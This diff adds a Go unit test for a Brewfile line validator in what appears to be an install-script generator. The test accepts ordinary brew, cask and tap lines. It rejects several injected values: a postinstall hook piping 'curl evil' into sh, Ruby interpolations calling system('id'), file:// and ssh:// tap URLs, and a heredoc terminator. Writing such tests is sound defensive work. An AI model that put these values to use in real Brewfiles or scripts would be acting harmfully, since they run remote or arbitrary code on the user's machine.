@@ -294,3 +294,41 @@ func TestInstallScriptRefusesInjectedNames(t *testing.T) {
 		t.Errorf("heredoc terminator appears more than once:\n%s", script)
 	}
 }
+
+// What brew bundle dump writes passes; what runs a command, or reaches an
+// interpolation, does not.
+func TestSafeBrewLine(t *testing.T) {
+	for _, l := range []string{
+		`tap "homebrew/cask-fonts"`,
+		`tap "me/tools", "https://github.com/me/homebrew-tools"`,
+		`brew "postgresql@16", restart_service: :changed`,
+		`brew "nginx-full", args: ["with-rtmp-module"], link: false`,
+		`cask "firefox", args: { appdir: "~/Applications" }`,
+		`cask "iterm2", greedy: true`,
+		`mas "Final Cut Pro", id: 424389933`,
+		`mas "C# Notes", id: 1234`,
+		`brew 'single-quoted'`,
+		`vscode "ms-python.python"`,
+		`brew "git" # a comment`,
+	} {
+		if !SafeBrewLine(l) {
+			t.Errorf("rejected a line brew bundle writes: %s", l)
+		}
+	}
+	for _, l := range []string{
+		`brew "x", postinstall: "curl evil | sh"`,
+		`cask "x", postinstall: "${HOMEBREW_PREFIX}/bin/x --setup"`,
+		`brew "x#{system('id')}"`,
+		`brew "x#@evil"`,
+		`brew "x#$evil"`,
+		`tap "evil/tap", "file:///tmp/evil"`,
+		`tap "evil/tap", "ssh://host/repo"`,
+		`system("id")`,
+		`brew "a", args: [system("id")]`,
+		`BREWFILE`,
+	} {
+		if SafeBrewLine(l) {
+			t.Errorf("accepted: %s", l)
+		}
+	}
+}
